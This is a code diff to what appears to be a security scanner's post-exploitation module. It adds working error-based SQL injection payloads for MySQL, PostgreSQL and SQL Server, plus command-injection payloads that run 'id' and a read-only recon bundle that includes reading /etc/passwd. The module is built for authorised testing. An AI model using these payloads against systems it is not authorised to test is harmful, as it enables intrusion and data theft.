@@ -1,13 +1,20 @@
 #!/usr/bin/env node
 /**
  * Impact / post-exploitation proof — the "so what" layer. It goes beyond "this is exploitable" to
- * safely DEMONSTRATE the blast radius, using BENIGN read-only markers (never destructive):
- *   - SQLi  → data extraction: pull database METADATA (version / current user) via the exact DBMS
- *             error format, proving real read access to the database, not just injectability.
- *   - RCE   → privilege context: run `id` and report the OS user (and whether it's ROOT).
- * Zero-FP: each demo confirms on a highly specific, provider-exact signature that only appears when
- * the payload actually executed. It re-uses the engine's method-aware injector + fetcher (passed in).
+ * safely DEMONSTRATE the blast radius, using BENIGN, READ-ONLY, BOUNDED actions (never destructive —
+ * no writes, no deletes, no data exfiltration beyond metadata evidence):
+ *   - SQLi  → data-access proof: pull database METADATA (version / current user / current database /
+ *             count of readable tables from information_schema) via the exact DBMS error format,
+ *             proving real READ access to the database and its schema — not just injectability.
+ *   - RCE   → foothold proof: confirm command execution with the `id` oracle, then capture a bounded
+ *             read-only recon bundle (whoami / hostname / uname / first line of /etc/passwd) between
+ *             random nonce markers — a real interactive foothold, demonstrated without touching anything.
+ * Zero-FP: each demo confirms on a highly specific signature that only appears when the payload
+ * actually executed (a provider-exact DBMS error; a random nonce that could only be echoed by a shell).
+ * It re-uses the engine's method-aware injector + host-gated fetcher (passed in).
  */
+
+import { randomUUID } from 'node:crypto';
 
 const F = (tool, severity, target, detail) => ({
   tool,
@@ -17,54 +24,113 @@ const F = (tool, severity, target, detail) => ({
   raw: JSON.stringify({ tool, detail }),
 });
 
-// Exact DBMS error formats these extraction techniques produce → provider-specific, zero-FP.
+// Exact DBMS error formats these extraction techniques produce → provider-specific, zero-FP. Grouped by
+// fact; sqliExtract tries providers in order and keeps the first value it pulls for each fact.
 const EXTRACTORS = [
-  ["' AND extractvalue(1,concat(0x7e,version()))-- -", /XPATH syntax error: '~([^']+)'/i, 'MySQL/MariaDB version'],
+  // ── MySQL / MariaDB — error-based via extractvalue() → "XPATH syntax error: '~<value>'" ──
+  ["' AND extractvalue(1,concat(0x7e,version()))-- -", /XPATH syntax error: '~([^']+)'/i, 'DB version'],
+  ["' AND extractvalue(1,concat(0x7e,current_user()))-- -", /XPATH syntax error: '~([^']+)'/i, 'DB user'],
+  ["' AND extractvalue(1,concat(0x7e,database()))-- -", /XPATH syntax error: '~([^']+)'/i, 'current database'],
   [
-    "' AND extractvalue(1,concat(0x7e,current_user()))-- -",
+    "' AND extractvalue(1,concat(0x7e,(SELECT count(*) FROM information_schema.tables)))-- -",
     /XPATH syntax error: '~([^']+)'/i,
-    'MySQL/MariaDB current user',
+    'readable table count',
+  ],
+  // ── PostgreSQL — error-based via failed int cast → 'invalid input syntax for integer: "<value>"' ──
+  ["' AND 1=cast(version() as int)-- -", /invalid input syntax for (?:type )?integer: "([^"]+)"/i, 'DB version'],
+  ["' AND 1=cast(current_user as int)-- -", /invalid input syntax for (?:type )?integer: "([^"]+)"/i, 'DB user'],
+  [
+    "' AND 1=cast(current_database() as int)-- -",
+    /invalid input syntax for (?:type )?integer: "([^"]+)"/i,
+    'current database',
   ],
   [
-    "' AND 1=cast(version() as int)-- -",
+    "' AND 1=cast((SELECT 't='||count(*) FROM information_schema.tables) as int)-- -",
     /invalid input syntax for (?:type )?integer: "([^"]+)"/i,
-    'PostgreSQL version',
+    'readable table count',
   ],
-  ["' AND 1=convert(int,@@version)-- -", /Conversion failed when converting[^']*'([^']+)'/i, 'SQL Server version'],
+  // ── SQL Server — error-based via failed convert → "Conversion failed ... '<value>'" ──
+  ["' AND 1=convert(int,@@version)-- -", /Conversion failed when converting[^']*'([^']+)'/i, 'DB version'],
+  ["' AND 1=convert(int,current_user)-- -", /Conversion failed when converting[^']*'([^']+)'/i, 'DB user'],
+  ["' AND 1=convert(int,db_name())-- -", /Conversion failed when converting[^']*'([^']+)'/i, 'current database'],
 ];
 
 async function sqliExtract(url, { fetchT, injReq }) {
   const bl = injReq(url, 'sxnormal123');
   const baseline = (await fetchT(bl.url, bl.opts)).body || '';
+  const facts = [];
+  const seenType = new Set();
+  const seenVal = new Set();
   for (const [payload, re, what] of EXTRACTORS) {
+    if (seenType.has(what)) continue; // already pulled this fact from an earlier provider
     const q = injReq(url, payload);
     const body = (await fetchT(q.url, q.opts)).body || '';
     const m = body.match(re);
-    if (m && m[1] && m[1].length >= 3 && !baseline.includes(m[1]))
-      return F(
-        'impact-sqli-extract',
-        'critical',
-        url,
-        `SQLi data extraction PROVEN: pulled ${what} → "${m[1].slice(0, 80)}" via error-based injection — the database is READABLE, not merely injectable`,
-      );
+    // The error FORMAT is the zero-FP oracle (it only appears when the injected query executed).
+    // Guard against reflected input by ignoring a value already in the benign baseline; and dedupe by
+    // VALUE — if two fact types return byte-identical values, the channel isn't actually
+    // distinguishing them (e.g. a sink that echoes one constant error), so we must not claim we pulled
+    // separate pieces of data. Report each distinct value once, honestly.
+    if (m?.[1] && !baseline.includes(m[1]) && !seenVal.has(m[1])) {
+      facts.push(`${what}="${m[1].slice(0, 80)}"`);
+      seenType.add(what);
+      seenVal.add(m[1]);
+    }
   }
-  return null;
+  if (!facts.length) return null;
+  return F(
+    'impact-sqli-extract',
+    'critical',
+    url,
+    `SQLi data-access PROVEN via error-based injection — the database is READABLE, not merely injectable: ${facts.join('; ')}`,
+  );
 }
 
+// Bounded, read-only recon run once command execution is proven. Every command only READS state.
+const RECON_BUNDLE = 'whoami; hostname; uname -a; head -n 1 /etc/passwd';
+
 async function cmdContext(url, { fetchT, injReq }) {
-  for (const payload of [';id', '|id', '`id`', ';id #', '& id']) {
-    const q = injReq(url, payload);
-    const body = (await fetchT(q.url, q.opts)).body || '';
-    const m = body.match(/uid=(\d+)\(([\w.-]+)\)\s+gid=\d+\([\w.-]+\)/);
-    if (m)
-      return F(
-        'impact-cmd-context',
-        'critical',
-        url,
-        `Command-execution IMPACT PROVEN: ran 'id' → uid=${m[1]}(${m[2]})${m[1] === '0' ? ' — running as ROOT' : ''} — full OS command execution in this account`,
-      );
+  const UID_RE = /uid=(\d+)\(([\w.-]+)\)\s+gid=\d+\([\w.-]+\)/;
+  // 1) Find a working separator using the `id` oracle (uid=…(…) is unforgeable unless a shell ran it).
+  let hit = null;
+  for (const sep of [';', '|', '&']) {
+    for (const suffix of ['', ' #']) {
+      const q = injReq(url, `${sep}id${suffix}`);
+      const body = (await fetchT(q.url, q.opts)).body || '';
+      const m = body.match(UID_RE);
+      if (m) {
+        hit = { sep, uid: m[1], user: m[2] };
+        break;
+      }
+    }
+    if (hit) break;
   }
-  return null;
+  if (!hit) return null;
+
+  // 2) RCE confirmed → capture a BOUNDED, READ-ONLY recon bundle between random nonce markers. The
+  //    nonce could only appear in the response if our echo actually ran, so the captured block is
+  //    genuine command output (zero-FP) — and nothing here writes, deletes, or exfiltrates data.
+  const nonce = randomUUID().replace(/-/g, '');
+  const open = `SX${nonce}O`;
+  const close = `SX${nonce}C`;
+  let evidence = '';
+  try {
+    const q = injReq(url, `${hit.sep} echo ${open}; ${RECON_BUNDLE}; echo ${close}`);
+    const body = (await fetchT(q.url, q.opts)).body || '';
+    const mm = body.match(new RegExp(`${open}\\s*([\\s\\S]*?)\\s*${close}`));
+    if (mm) evidence = mm[1].trim().slice(0, 400);
+  } catch {
+    /* recon is best-effort; the id oracle already proved execution */
+  }
+
+  const rootTag = hit.uid === '0' ? ' — running as ROOT' : '';
+  const evLine = evidence ? `\n  Read-only recon (whoami/hostname/uname/passwd):\n${evidence}` : '';
+  return F(
+    'impact-cmd-context',
+    'critical',
+    url,
+    `Command-execution IMPACT PROVEN: ran 'id' → uid=${hit.uid}(${hit.user})${rootTag} — full OS command execution in this account.${evLine}`,
+  );
 }
 
 // deps: { fetchT, injReq } from the engine (so injection stays method-aware + host-gated).
